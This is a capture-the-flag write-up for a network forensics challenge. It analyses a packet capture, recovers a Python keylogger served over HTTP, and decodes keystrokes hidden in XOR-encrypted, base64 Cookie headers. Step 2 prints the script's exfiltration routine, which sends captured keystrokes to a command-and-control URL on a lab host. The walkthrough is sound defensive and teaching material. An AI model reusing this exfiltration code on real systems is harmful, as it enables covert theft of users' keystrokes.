# Day 4
- **Challenge name:** [Packed Light](https://tryhackme.com/room/hh-packedlight-02e5330c)
- **Category:** Network Forensics / Traffic Analysis
- **Difficulty:** Easy
- **Date completed:** 30th July 2026

## Summary
This challenge drops you into a packet capture from the Byte Lotus guest network alongside a breadcrumb from @0xMia: her laptop is aggressively pinging an arbitrary address on port 8080 every single second, with request headers that scream suspicious. The mission is to dissect the capture, hunt down the covert data-smuggling channel hidden in plain sight across those HTTP requests, reassemble the fragments, and decode the payload to extract the flag.

<img width="684" height="457" alt="image" src="https://github.com/user-attachments/assets/f19e02a3-58f8-4902-9de8-9046c7d315a2" />

## Exploitation / Walkthrough
### Step 1
I fired up Wireshark on my personal machine to inspect the pcap file. Armed with @0xMia's tip pointing directly to port 8080, I threw on an http display filter to instantly strip out the network noise and focus solely on the web traffic.

### Step 2
Drilling down into the HTTP requests, I sorted by the Length column to hunt down any structural anomalies. Sure enough, a massive outlier caught my eye: a GET /temp/updates.py transaction returning a Content-type: text/x-python header. Inspecting the payload revealed the complete, unredacted source code of a custom Python script being actively served off the target host.

```python
import requests
import base64
from pynput import keyboard

C2_URL = "http://byte-lotus-hotel.thm:8080/"

def getkey():
    p1 = "H0t3lSt@ff0Nly"
    p2 = "K3epS3cr3t!"
    return p1 + p2

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def sendltr(character):
    raw_bytes = character.encode('utf-8')
    encrypted = xor(raw_bytes, getkey().encode('utf-8'))
    b64_string = base64.b64encode(encrypted).decode('utf-8')
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1",
        "Cookie": f"hotel_sess_state={b64_string}"
    }
    try:
        requests.get(C2_URL, headers=headers, timeout=0.5)
    except:
        pass
```


### Step 3
Analyzing the recovered script unmasked a custom keylogger routine. It captured keystrokes, XOR-ed each one against a static key, base64-encoded the payload, and smuggled it directly inside the Cookie header (hotel_sess_state) of an incoming GET request to the C2 root path. This perfectly explained @0xMia's report of rhythmic pings and the weird ByteLotusClient/1.1 User-Agent.

With the exfiltration channel mapped out, the next step was isolating the sequential beacon traffic targeting port 8080 and extracting the ordered Cookie values. 


Right-click the Cookie header in the packet details and select Apply as Column. Filter by http.request, sort chronologically, and just gaze at the new column like it’s your favorite cozy read scrolling right down the screen. It takes a tiny bit of manual clicking, but honestly, setting it up feels like unlocking a little cheat code. Sure, it’s a tiny bit hands-on, but it's super satisfying once everything is done.


Once collected, I had a list of 30 base64 strings, one per keystroke:
```
HA==
AA==
BQ==
Mw==
Hg==
ew==
Og==
fA==
Fw==
eQ==
Ow==
Fw==
Pw==
fA==
PA==
Kw==
IA==
eQ==
Jg==
Lw==
Fw==
eA==
Pg==
LQ==
Gg==
Fw==
MQ==
eA==
PQ==
NQ==
```

### Step 4
To decode the payload, I needed to reverse the script's encryption cycle: base64-decode first, then apply an XOR operation with the correct key.

The catch was figuring out which slice of the key actually mattered. Standard XOR encryption loops through a multi-character key sequentially as a string grows, but this script was fundamentally different. It executed sendltr() for every individual keystroke, encrypting a single character at a time. Because the input string was always strictly one character long, the XOR loop never advanced past the initial index.

Every single intercepted keystroke was effectively XOR'd exclusively with the very first letter of the key, over and over again. According to the recovered Python source code, the complete key was constructed as p1 + p2 (H0t3lSt@ff0NlyK3epS3cr3t!), meaning the single active character doing all the heavy lifting was simply H.

### Step 5
Ran the 30 cookie values through [CyberChef](https://gchq.github.io/CyberChef/) with the following recipe:
1. **From Base64** - standard alphabet
2. **XOR** - key `H`, key type Latin1/UTF8, standard scheme

Mission Accomplished!

## Tools Used
- Wireshark
- CyberChef

## Flag
![redacted](https://img.shields.io/badge/-REDACTED-000000)

## Lessons Learned
Key takeaway: Malicious traffic doesn't need to look chaotic or screamingly obvious. It can masquerade as completely mundane Cookie headers riding on standard GET requests. The giveaway is the behavioral pattern rather than the packet contents: relentless, rhythmic repetition firing off against the exact same host and port every single second.

Also, if a misconfigured server hands you source code on a silver platter, stop and read it. Sifting through that Python script eliminated the need to guess or reverse-engineer the encryption blind, saving a massive amount of time because the code documented its own inner workings.
